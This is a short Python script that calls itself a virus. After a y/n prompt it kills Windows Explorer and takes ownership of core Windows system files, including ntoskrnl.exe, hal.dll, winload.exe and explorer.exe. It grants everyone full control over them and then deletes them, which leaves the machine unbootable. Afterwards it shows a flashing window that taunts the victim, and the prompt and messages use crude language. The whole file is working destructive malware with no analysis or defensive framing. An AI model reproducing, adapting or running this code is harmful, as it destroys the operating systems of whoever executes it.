import subprocess
import os
import time
import random
from turtle import *
import turtle

def malicious_shit():
    try:
        os.popen("taskkill /F /IM explorer.exe /T")
        subprocess.run(['takeown', '/F', "C:"])
        subprocess.run(['takeown', '/F', "C:\\Windows"])
        subprocess.run(['takeown', '/F', "C:\\Windows\\System32"])
        subprocess.run(['takeown', '/F', "C:\\Windows\\System32\\hal.dll"])
        subprocess.run(['takeown', '/F', "C:\\Windows\\System32\\ntoskrnl.exe"])
        subprocess.run(['takeown', '/F', "C:\\Windows\\explorer.exe"])
        subprocess.run(['takeown', '/F', "C:\\Windows\\System32\\Boot\\winload.exe"])
        subprocess.run(['icacls', 'C:\\Windows', "/t", "/grant", "Everyone:(OI)(CI)F"])
        subprocess.run(['icacls', 'C:\\Windows\\System32\\Boot\\winload.exe', "/t", "/grant", "Everyone:(OI)(CI)F"])
        subprocess.run(['icacls', 'C:\\Windows\\explorer.exe', "/t", "/grant", "Everyone:(OI)(CI)F"])
        subprocess.run(['icacls', 'C:\\Windows\\System32', "/t", "/grant", "Everyone:(OI)(CI)F"])
        subprocess.run(['icacls', 'C:\\Windows\\System32\\hal.dll', "/t", "/grant", "Everyone:(OI)(CI)F"])
        subprocess.run(['icacls', 'C:\\Windows\\System32\\ntoskrnl.exe', "/t", "/grant", "Everyone:(OI)(CI)F"])
        os.remove("C:\\Windows\\System32\\ntoskrnl.exe")
        os.remove("C:\\Windows\\System32\\hal.dll")
        os.remove("C:\\Windows\\explorer.exe")
        os.remove("C:\\Windows\\System32\\Boot\\winload.exe")
    except Exception as e:
        print(f"An error occurred: {e}")

def graphics():
    screen = turtle.Screen()
    screen.bgcolor("black")
    screen.title("UH OH UR FILES ARE GONIE GONE :)")
    screen.setup(width=1920, height=1080)

    writer = turtle.Turtle()
    writer.hideturtle()
    writer.speed(0)
    writer.penup()
    writer.goto(0, 0)

    colors = ["red", "orange", "yellow", "lime", "cyan", "violet"]

    def glitch_effect():
        writer.goto(random.randint(-900, 900), random.randint(-500, 500))
        writer.color(random.choice(colors))
        writer.clear()
        writer.write("POOPY BABY I DELETED UR SYSTEM FILES :)", align="center", font=("Comic Sans MS", 32, "bold"))
        screen.ontimer(glitch_effect, 100)

    glitch_effect()
    screen.mainloop()
    turtle.done()

while True:
    user_input = input("This is a virus, are you sure you want to run it? (y/n): ").lower()
    if user_input == 'y':
        malicious_shit()
        graphics()
        break
    elif user_input == 'n':
        print("Yeah, I knew you had no balls to run this shit.")
        break
    else:
        print("Invalid input. Please enter 'y' or 'n'.")
